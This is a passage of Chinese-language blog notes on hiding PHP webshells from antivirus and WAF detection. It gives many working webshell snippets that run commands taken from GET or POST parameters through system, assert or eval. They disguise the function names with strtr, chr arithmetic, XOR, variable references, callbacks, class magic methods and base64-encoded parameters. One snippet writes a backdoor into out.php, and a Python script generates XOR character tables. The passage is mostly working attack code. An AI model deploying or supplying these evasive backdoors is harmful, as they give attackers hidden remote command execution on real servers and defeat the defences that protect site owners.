+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hahaha</span> = <span class="title function_ invoke__">strtr</span>(<span class="string">&quot;abatme&quot;</span>,<span class="string">&quot;me&quot;</span>,<span class="string">&quot;em&quot;</span>); <span class="comment">//$hahaha = abatem</span></span><br><span class="line"><span class="variable">$wahaha</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$hahaha</span>,<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;sy&quot;</span>); <span class="comment">//$wahaha = system（高危函数）</span></span><br><span class="line"><span class="comment">#echo $wahaha;</span></span><br><span class="line"><span class="comment">/*$gogogo = strtr(&#x27;echo &quot;&lt;?php evqrw$_yKST[AABYSS])?&gt;&quot; &gt;./out.php&#x27;,&quot;qrwxyK&quot;,&quot;al(_PO&quot;);//$gogogo = &#x27;echo &quot;&lt;?php eval(_POST[AABYSS])\?\&gt;&quot; &gt; ./out.php&#x27;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*$go=strtr(&#x27;echo &quot;&lt;?php evqrw$_KST[CMD]?&gt;&quot; &gt;./out.php&#x27;,&quot;qrwSK&quot;,&quot;al(EG&quot;);*/</span></span><br><span class="line"><span class="comment">#echo &quot;&lt;br&gt;&quot;.$go;</span></span><br><span class="line"><span class="comment">#$go=str_replace(&#x27;&quot;&#x27;, &#x27;&#x27;, $go); //去掉引号就写不进去了</span></span><br><span class="line"><span class="comment">#echo &quot;&lt;br&gt;&quot;.$go;</span></span><br><span class="line"><span class="comment">//$wahaha($go); //将一句话木马内容写入同目录下的out.php中，但是这里会写进双引号</span></span><br><span class="line"><span class="variable">$go</span>=<span class="title function_ invoke__">strtr</span>(<span class="string">&#x27;&quot;&lt;?php evqrw$_KST[CMD]c;?&gt;&quot;&#x27;</span>,<span class="string">&quot;qrwSKc&quot;</span>,<span class="string">&quot;al(EG)&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./out.php&#x27;</span>,<span class="variable">$go</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用到的strtr函数(<strong>不</strong>是strstr)需要注意下</p>
+<p><code>strtr(&quot;123456&quot;,&quot;45&quot;,&quot;23&quot;)</code></p>
+<p>这里是将12345中的4替换为2；5替换为3，是一种一一映射的替换关系，而不是整个字符串</p>
+<p>如果后两个参数长度不相等，那么匹配不到的部分就不会替换而已</p>
+<p>这里注意几个点：</p>
+<p>1.方括号里的变量要用单引号，既然如此是可以先声明变量再使用的</p>
+<p>如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&lt;?php <span class="subst">$co</span>=&quot;</span>cmd<span class="string">&quot;;system(<span class="subst">$_GET</span>[<span class="subst">$co</span>]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.写进文件里的双引号不影响使用</p>
+<p>3.分号不能丢</p>
+<p>4.另外eval是什么毛病，有时候真的用不了</p>
+<h3 id="0x04-回调函数"><a href="#0x04-回调函数" class="headerlink" title="0x04 回调函数"></a>0x04 回调函数</h3><h4 id="a-call-user-func-array"><a href="#a-call-user-func-array" class="headerlink" title="a.call_user_func_array()"></a>a.call_user_func_array()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ASCII编码解密后为assert高危函数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="number">98</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>-<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>+<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>+<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$f</span>, <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="b-array-map"><a href="#b-array-map" class="headerlink" title="b. array_map()"></a>b. array_map()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;<span class="comment">//ASCII编码解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="number">98</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>-<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>+<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>+<span class="number">6</span>);<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">fun</span>(); <span class="comment">//拿到assert高危函数$</span></span><br><span class="line">pass =<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$user</span>,<span class="variable">$user</span> = <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure>
+
+<p>这里仅仅记录一下，感觉尽量避免使用，这种固定函数名，应该还是要进行变形的</p>
+<h3 id="0x05-可变变量绕过"><a href="#0x05-可变变量绕过" class="headerlink" title="0x05 可变变量绕过"></a>0x05 可变变量绕过</h3><h4 id="a-简单型"><a href="#a-简单型" class="headerlink" title="a.简单型"></a>a.简单型</h4><p>这里执行不了，知道个意思就可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">#$$f = $_POST[&#x27;aabyss&#x27;];</span></span><br><span class="line"><span class="variable">$$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yly&#x27;</span>];<span class="comment">//即$hello=$_GET[&#x27;yly&#x27;]</span></span><br><span class="line"><span class="keyword">eval</span>(``.<span class="variable">$hello</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="b-数组-变量引用"><a href="#b-数组-变量引用" class="headerlink" title="b.数组+变量引用"></a>b.数组+变量引用</h4><p>compact创建一个包含变量名和其值的数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;John&#x27;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$city</span> = <span class="string">&#x27;New York&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">compact</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;city&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [name] =&gt; John</span><br><span class="line">    [age] =&gt; <span class="number">30</span></span><br><span class="line">    [city] =&gt; New York</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//当其它免杀传递system给z后</span></span><br><span class="line"><span class="variable">$z</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$yinyong</span>=&amp;<span class="variable">$z</span>;</span><br><span class="line"><span class="variable">$event</span>=<span class="string">&#x27;yly&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">compact</span>(<span class="string">&quot;event&quot;</span>,<span class="string">&quot;yinyong&quot;</span>);</span><br><span class="line"><span class="variable">$z</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$res</span>[<span class="string">&#x27;yinyong&#x27;</span>];</span><br><span class="line"><span class="comment">#$f($_POST[&#x27;cmd&#x27;]);</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个原理就是，避免WAF追踪，WAF追踪z时，会认为z是123456了，而不是system</p>
+<h3 id="0x06-数组绕过"><a href="#0x06-数组绕过" class="headerlink" title="0x06 数组绕过"></a>0x06 数组绕过</h3><p>这个就是将函数存储在数组中，到时候去取，去拼接</p>
+<h4 id="a-二维数组"><a href="#a-二维数组" class="headerlink" title="a.二维数组?"></a>a.二维数组?</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;systxx&quot;</span>,<span class="string">&quot;em&quot;</span>,<span class="number">4</span>); <span class="comment">//system（高危函数）</span></span><br><span class="line"><span class="comment">#echo $f;</span></span><br><span class="line"><span class="variable">$z</span> = <span class="keyword">array</span>(<span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$z</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">123</span>));</span><br></pre></td></tr></table></figure>
+
+<p>首先array(‘a’&#x3D;&gt;123))，即$array创建了一个关联数组，这属于键值关系</p>
+<p>array($array)，又是一个数组，可以看做一个二维数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$z</span> = <span class="keyword">array</span>(<span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="number">3</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>[<span class="number">0</span>][<span class="string">&#x27;a&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$z</span>[<span class="number">0</span>][<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$z</span>);</span><br><span class="line"><span class="comment">//array(1) &#123; [0]=&gt; array(3) &#123; [&quot;a&quot;]=&gt; int(1) [&quot;b&quot;]=&gt; int(2) [&quot;c&quot;]=&gt; int(3) &#125; &#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="b-多维数组？"><a href="#b-多维数组？" class="headerlink" title="b.多维数组？"></a>b.多维数组？</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;systxx&quot;</span>,<span class="string">&quot;em&quot;</span>,<span class="number">4</span>); <span class="comment">//system（高危函数）</span></span><br><span class="line"><span class="variable">$z</span> = <span class="keyword">array</span>(<span class="variable">$arrayName</span> = (<span class="variable">$arrayName</span> = (<span class="variable">$arrayName</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt;<span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])))));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$z</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$z</span> = <span class="keyword">array</span>(<span class="variable">$arrayName</span> = (<span class="variable">$arrayName</span> = (<span class="variable">$arrayName</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt;<span class="number">1234</span>))));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>[<span class="number">0</span>][<span class="string">&#x27;a&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$z</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//1234</span></span><br><span class="line"><span class="comment">//array(1) &#123; [0]=&gt; array(1) &#123; [&quot;a&quot;]=&gt; int(1234) &#125; &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>什么意思，这个也是二维数组？</p>
+<h3 id="0x07-类绕过"><a href="#0x07-类绕过" class="headerlink" title="0x07 类绕过"></a>0x07 类绕过</h3><p>主要是魔法函数的使用</p>
+<h4 id="a-单类—析构函数"><a href="#a-单类—析构函数" class="headerlink" title="a.单类—析构函数"></a>a.单类—析构函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_1</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;_1&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$_2 = new Test;$_2-&gt;$_1 = $_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="variable">$_2</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$_2</span>-&gt;_1 = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个就是析构函数的作用，主函数中只是申请了个新类，然后对这个类的变量_1重新赋值，这样执行完毕后，触发析构函数，执行结果</p>
+<h4 id="b-多类—构造函数"><a href="#b-多类—构造函数" class="headerlink" title="b.多类—构造函数"></a>b.多类—构造函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> =<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">#return $_POST[&#x27;aabyss&#x27;];</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> <span class="keyword">extends</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">post</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fff</span> = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line"><span class="comment">#$zzz = new Test1; //没看懂这个的作用，不需要也可以触发</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当创建一个子类后，优先继承子类的值$code为空，执行完毕销毁，触发析构函数，调用父类的post()函数，返回值，赋值给$code，system执行，触发即可</p>
+<h3 id="0x08-嵌套运算绕过"><a href="#0x08-嵌套运算绕过" class="headerlink" title="0x08 嵌套运算绕过"></a>0x08 嵌套运算绕过</h3><p>包括但不限于用(嵌套、异或、运算的方式)拼接、动态函数执行，主要拼接高危函数</p>
+<h4 id="a-异或"><a href="#a-异或" class="headerlink" title="a.异或"></a>a.异或</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = (<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;$&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;@&#x27;</span>).(<span class="string">&#x27;8&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;]&#x27;</span>^<span class="string">&#x27;0&#x27;</span>); <span class="comment">//system高危函数</span></span><br><span class="line"><span class="comment">//等同于这样 $f = (&#x27;.$.48]&#x27; ^ &#x27;]]]@]0&#x27;); </span></span><br><span class="line"><span class="comment">#$f($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>具体的生成参考如下国光的py脚本，在linux下使用<code>python3 1.py &gt; 1.txt</code>即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">keys = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>)) + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">91</span>,<span class="number">97</span>)) + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">123</span>,<span class="number">127</span>))</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        asscii_number = i^j</span><br><span class="line">        <span class="keyword">if</span> (asscii_number &gt;= <span class="number">65</span> <span class="keyword">and</span> asscii_number &lt;= <span class="number">90</span>) <span class="keyword">or</span> (asscii_number &gt;= <span class="number">97</span><span class="keyword">and</span> asscii_number &lt;= <span class="number">122</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">32</span> <span class="keyword">and</span> j &lt; <span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = ascii:<span class="subst">&#123;i&#125;</span> ^ ascii<span class="subst">&#123;j&#125;</span> =<span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">32</span> <span class="keyword">and</span> j &gt;=<span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = ascii:<span class="subst">&#123;i&#125;</span> ^ <span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span> =<span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">elif</span> i &gt;= <span class="number">32</span> <span class="keyword">and</span> j &lt; <span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = <span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span> ^ ascii<span class="subst">&#123;j&#125;</span> =<span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = <span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span> ^ <span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span> =<span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">            	results.append(temp)</span><br><span class="line">                </span><br><span class="line">results.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> low_case <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> low_case <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> upper_case <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> upper_case <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+<p>生成字母的映射表如下</p>
+<blockquote>
+<p>s &#x3D; . ^ ] &#x3D;. ^ %5D</p>
+<p>y &#x3D; $ ^ ] &#x3D;%24 ^ %5D</p>
+</blockquote>
+<h4 id="b-嵌套运算"><a href="#b-嵌套运算" class="headerlink" title="b.嵌套运算"></a>b.嵌套运算</h4><p>看不懂，先略过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/147.html">https://blog.zgsec.cn/archives/147.html</a></p>
+<h3 id="0x09-传参绕过"><a href="#0x09-传参绕过" class="headerlink" title="0x09 传参绕过"></a>0x09 传参绕过</h3><p>恶意代码作为参数传入</p>
+<h4 id="a-base64传参"><a href="#a-base64传参" class="headerlink" title="a.base64传参"></a>a.base64传参</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$decrpt</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$arrs</span> =<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$decrpt</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$arrs</span>[<span class="number">0</span>],<span class="variable">$arrs</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这个时候a就输入一个比如whoami|system的base64(c3lzdGVtfHdob2FtaSAg )即可</p>
+<p>对于explode，类比于java或c#里的split函数，且分割为数组元素</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;www.runoob.com&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; www</span></span><br><span class="line"><span class="comment">    [1] =&gt; runoob</span></span><br><span class="line"><span class="comment">    [2] =&gt; com</span></span><br><span class="line"><span class="comment">)*/</span></span><br></pre></td></tr></table></figure>
+
